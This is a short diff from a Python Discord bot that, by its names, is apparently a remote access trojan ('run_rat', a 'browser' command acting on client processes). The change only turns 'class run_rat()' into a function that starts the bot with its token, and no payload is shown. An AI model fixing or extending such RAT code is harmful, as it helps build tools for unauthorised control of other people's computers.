@@ -497,5 +497,5 @@ async def browser(ctx, inputid, url):
         if inputid != 'all' and clientid:
             await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
         
-class run_rat():
+def run_rat():
     bot.run(btoken)
